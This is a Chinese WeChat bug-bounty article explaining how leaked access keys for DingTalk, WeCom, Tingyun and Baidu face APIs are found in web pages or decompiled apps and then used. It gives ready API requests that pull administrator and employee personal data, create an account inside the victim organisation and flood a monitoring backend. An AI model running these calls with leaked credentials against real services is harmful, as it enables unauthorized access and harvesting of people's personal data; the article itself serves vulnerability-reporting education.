---
title: 敏感信息泄露漏洞总结：深情哥提醒你aksk正在“裸奔”
url: https://mp.weixin.qq.com/s/WoktZOpx_GmhDUYgeBmAOw
source: Doonsec's feed
date: 2026-04-19
fetch_date: 2026-04-20T04:55:25.928584
---

# 敏感信息泄露漏洞总结：深情哥提醒你aksk正在“裸奔”

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/tlibgKYKL9EseXvokricicWZ47ply38woP2Wu7Ow4snyaPkNphRYAibmEZZlY6J2NUujt78gc2Gp9h2mb5hL3vf5RY2d0VdStDqjIDRecgroYM8/0?wx_fmt=jpeg)

# 敏感信息泄露漏洞总结：深情哥提醒你aksk正在“裸奔”

原创

湘南第一深情
湘南第一深情

湘安无事

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**声明：****由于传播、利用本公众号湘安无事所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！**

## **前言**

最近老是有学员问这个Appid和AppSecret怎么怎么利用，而且好多学员不认识这个aksk是什么，怎么操作。今天我把以前遇到的aksk的利用方式都总结一下，并且开发个aksk敏感信息管理在线web网站。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9Esn761ickJsdcfeX52jdsYpsK37piaVJp0QX34tomiczEgicOYpaGbuEBjEOpuOb0Tw0lia6T1KAYzRNaAr7Z8oTecCT39J56vXF1b0/640?wx_fmt=png&from=appmsg)

长下面这个样子，是不是很符合深情哥的风格,接下来讲各种泄露aksk该怎么利用~

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9Evu1exBdckMHufA1XQBvibZgd5vOaj1LJzekBMia4Lh0oBwPlpuIYvvAd9mrju80x1bm6Pv9OvfKHiaSFE40rzg5rU27BpPaRibpxY/640?wx_fmt=png&from=appmsg)

## 钉钉key的泄露-赏金500的报告

#### 1.api接口泄露，看我f12大法

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9Eu7BAgQASznscdsmBKzLdNEkaCnsnp1IVfa72O76aHUDgM3VgiaVESWsH0SLQcoYSDTg3AIkFO0b9DvvYueqPIicJ6uibPE4uw9WI/640?wx_fmt=png&from=appmsg)

#### 2.毫无疑问/m/dingding/api/getDDConfig这个路径看起来就很牛逼

应该是获取配置文件，然后根据js里面的提示构造请求，类似这样子

```
http://XXX.XXXX.XXX:8000/m/dingding/api/getDDConfig?corpId=XXXXXX&modelType=parking
```

哦吼，直接获取到一些信息，看起来像密钥 里面还要钉钉网址

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tlibgKYKL9EsVgr9uZhw3rZ7OdRGtngGB2owHYv9WAw7m4o9EuY8Qt7buFJskYn6CtNqOOoNmQ9BlqArGmIoBib8bKqMIicQpzvd0f97wvKcf4/640?wx_fmt=other&from=appmsg)

类似这样子

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EserBYmj7T4iawib7UxvqJKAw7V3zLKSzfia984ltxHgq9jb3lPvgZsZ6ibPEXcgfKuF373DE0pibS55BjpgMsXDOVyjfz6Xia4ZrX3c/640?wx_fmt=png&from=appmsg)

#### 3.验证是否dingding-key可以利用,打开湘安社区

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EuURbIiba5KOdkGYJBNyp1GlwZy2JmDCOc6A2DHG9Gcm48XYqyfV5F7ZHNO7zvJZIq2SYz4GK34l2fjialOfpt7BQoLibxGMQOupk/640?wx_fmt=png&from=appmsg)

然后点击添加应用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EuQRiar1J3KSTq9BBTeG1Ws0vgwEMOZy4J4G7fY89DaO6ZenFvVrZypZR1yoMibbKbZRxkZsibEuDkfvb8X7NXjrJANDYdY5zP4Bw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EszL9SVorMoVtRCteyXXB0I4iareaq7mysFoye39QrJ0kX0wQftjnTUZn2IvojaveU4mTnicgoJbZEXuvK9IN1nhuW6qLQKtScts/640?wx_fmt=png&from=appmsg)

然后点击验证

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EsTH5l1c27e5jNNVs6KNDoxNWaYZPp4fe8kM5v7uhrSYiciafZO8ABGIRmMudibSbhQYlGT4RuMfQ5apkSeGal0VaS5Itu4ia34AicU/640?wx_fmt=png&from=appmsg)

#### 4.如果审核让你继续利用

钉钉获取管理员userid的接口

```
https://oapi.dingtalk.com/user/get_admin?access_token=XXXXXXXXXXXXXXXXXXXX
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EucLmlRibDpvULqO663S4pMiaYswBwYkcVVbk464B4rlCEITCRLGXC2yo4a2SIyWjJ4M61oUAm2REKJMsIZmW60MEsqZ5qwcr5Ow/640?wx_fmt=png&from=appmsg)

钉钉通过获取管理员userid参数信息得到个人敏感信息

```
https://oapi.dingtalk.com/user/get?access_token=XXXXXXXXXXXXXXXXXXXXXXXXX&userid=dd
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9Es5VpKDDyHlYA01q7alK2oY6seN7bfsEia8a2snshoBmLROib7pk7icQexlJcRDYj7yX7d4hhalEqzOEq58r0amQylK29b71HbFcM/640?wx_fmt=png&from=appmsg)

在钉钉添加部门成员api接口，这个操作慎用呀

```
POST /user/create?access_token=ACCESS_TOKEN_STRING HTTP/1.1Host: oapi.dingtalk.comContent-Type: application/jsonContent-Length: 356{    "userid": "test_20260218",    "name": "安全测试账号",    "orderInDepts": "123456789",    "department": [123456789],    "position": "测试工程师",    "mobile": "18888888888",    "tel": "010-88888888",    "workPlace": "杭州",    "remark": "授权安全测试",    "email": "test@test.com",    "orgEmail": "test@company.com",    "jobnumber": "T001",    "isHide": false,    "isSenior": false}
```

或者curl

```
curl -X POST 'https://oapi.dingtalk.com/user/create?access_token=YOUR_ACCESS_TOKEN' \-H 'Content-Type: application/json' \-d '{    "userid": "test_20260218",    "name": "安全测试账号",    "mobile": "18888888888",    "department": [123456789],    "position": "测试工程师",    "email": "test@test.com"}'
```

我不小心添加之后直接进去到别人钉钉群里面去了，这不妥妥的被抓

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EuoAlnU0UgDde7ktuAqticl8HfBWnfUzYNFyR1giceA2QSicfxGDOscZFwZVVV6STKIjqszOL7XfyItr00wqWPhGmdzhfAgDrXxmI/640?wx_fmt=png&from=appmsg)

利用到这里差不多了，具体可看钉钉的接口文档

```
https://open.dingtalk.com/document/isvapp-server/queries-department-user-details-1
```

妈的 因为是第三方开发的信息，被降级了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9Esl4YibWVsoVxicpIQ7vDF56AFsl8CgSBYOmhbBvPARjFOH1CQzXpia2YiaBUx5aCd3iaJWQARlwJe80ichfYCzeakW4GTrxZiapzibdrc/640?wx_fmt=png&from=appmsg)

## 企业微信key-价值2000大洋的报告

#### 1.f12再web网站接口发现存在泄露

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EtMzyv8Ypy5K0lemz8HaYeBaukHMecIibAfJVYNz5JG50ianzltsoS3oC4gOznDLxhPciaIleYctmLBMfoibVBlOibAPUHSsjZ4Jtn0/640?wx_fmt=png&from=appmsg)

#### 2.然后拿到网站上面测试

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EtbZVXcqsrYjd3TiaJtKCib93dibzTXeRyebFMcx2ckHIJQ2gIAysO56FibyHwAOoNeVicwjUU5ErNujkOqmp9BzHzALYwSaD8wRCtc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EtVnB9nm5PJa7icbNW1iaD8iaUrJgcicVtdh9biaoYSAyOQSNJ4RkhTBSXsf1DWibY7yIiarSiavZzd4ibACV0BDx2czPTe1OmUvWfInBbQ/640?wx_fmt=png&from=appmsg)

成功了就会返回token

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9Es3PtalVFcWgDUTk3eiacy6nia9pgugbHmIePxBspeM78AYgics4u5k0FOuIP2cYSBQvlW381PsKIxTkVdWhl52Q4vhb1AuoH4KnQ/640?wx_fmt=png&from=appmsg)

#### 3.如果审核让你利用就下面这样子操作

```
GET https://qyapi.weixin.qq.com/cgi-bin/user/get?access_token=ACCESS_TOKEN&userid=USERID
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EvTdn9WHtT256WDuBMgZHHh5dx92oTEcANprG8nOUdiavT8P3b7co7UQ6icTs5eXYZsJeicebRibcZcGyEiaVqvRoFmnasCjibOxV3OM/640?wx_fmt=png&from=appmsg)

userid一般是姓名便利一下即可，比如zhangmin

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EvRmdwwEI6zx0iaWM7IWHqB8012icWKqKd9iaicleFUGKXIV543tlxu0S14oicw9SNBqLE6ibTxj3eVRcuIvkFWHZSpVRj7Lqiam1Ag2I/640?wx_fmt=png&from=appmsg)

可以直接跑出很多人的敏感信息，直接给了高危

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EtZrmrhEicgyP6h4zdeOQUto8oyC4icHlgCqgBEGrqVZW7gAeoPgomia6OwrhIFz9yic3NiaGaLPJZxqJVNvMRK3KeX3tDpO33icH90Q/640?wx_fmt=png&from=appmsg)

####

## 微信key-价值500大洋的报告

具体看之前深情哥写的文章，下次撩妹用这招好嘛~

[公众号接管漏洞之偷偷加小姐姐微信](https://mp.weixin.qq.com/s?__biz=MzU3Mjk2NDU2Nw==&mid=2247494345&idx=1&sn=6d9ab80cde99e95c4d1ac710e091ffdd&scene=21#wechat_redirect)

## 听云key-价值300的报告-有点抽象

后台发现了另一个站存在听云并且有key和token，f12大法发现泄露听云key

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9EujBOABUAib5vunk4e1pUiamvkPIq9CwtMOkJsbpwOpXg9LvEu26KA7nvctvG58tHoZDkk4rAUT9DHRUMnErRPliakQph9g0fILEM/640?wx_fmt=png&from=appmsg)

什么是听云？

```
你可以把听云理解成一个网站的“私人医生”或“体检中心”。网站（如你例子中的中邮人寿）在代码里嵌入听云提供的探针后，探针就会持续收集网站的运行状况、用户访问体验等数据，并报告给听云的服务器。这样，网站的技术人员就能通过听云平台实时了解网站的健康状况，快速定位问题
```

根据听云的接口文档构造了下面数据包这段代码就是**听云Web探针的初始化配置脚本**，直接嵌入在网站的HTML页面中。它的作用是在用户浏览器中启动听云的监控功能。

```
其中就是可以通过接口不断提交危险信息给后台，造成数据冗余
```

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9Evhx0miaKp3KDPjULfEAblM5CibdWHDZIKJGgekLJILmicM5oYQSicZ4RQqIx2DWqsTUmbbKAgPFKCAfRWG2MUfcsIxfXrRib0mehnI/640?wx_fmt=png&from=appmsg)

直接评级了个中，有点抽象，宝子们下次自己多试试

![](https://mmbiz.qpic.cn/mmbiz_png/tlibgKYKL9Etf90sdsHxp04J0edKm3iazN8qTYIqmnFsUhHpkWibSaibibpIT3gySpIqQE3FHHyjxgficdmVrNnsZ5HIe5coxkIUiamKVia27vQhQdo/640?wx_fmt=png&from=appmsg)

## 百度人脸key-低微的报告-100元

1.app反编译查找关键字找出来的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9Eu3mdyEm6DkDUuEbNnJscd14BWeticflnlZibQicZbv09RcEQRuWOhicnhC24zLpyn8UkYWWONSUxsuJ4cN0GNUZwI2cntkkiaUN0Ag/640?wx_fmt=png&from=appmsg)

#### 2.直接找到这个key

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EuZwexrPMqHicxEGPxPn3RN2rsUnicbrLjBHUVibqq391EqB3Hbyu9xibQnYibXWQwQmnMovRiaI4ZHZ1zjp3DkSKZnFYmP5OjYk2IFY/640?wx_fmt=png&from=appmsg)

根据对这个app的分析应该是人脸的key

人脸的ak secert

人脸调用的接口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tlibgKYKL9EsfeZ6jk7qpC2bHAUxB6pOE3kSKzkY4htEaUTE4m32nyEFpYbOFdYhChCNibn6YOic4xIPicJTsq9PAhCx50JMpxzxdO8mFwaibNQA/640?wx_fmt=png&from=appmsg)

#### 3.百度人脸key第三方文档

```
https://ai.baidu.com/ai-doc/REFERENCE/Ck3dwjhhu
```

自行查看

```
https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=pXuzuyEU0tnjwpKmNBpxxxc&client_secret=VRfVVGtlSpl1Z0UhuRgxxxxxSSmW7A
```

返回下面这个就说明可以...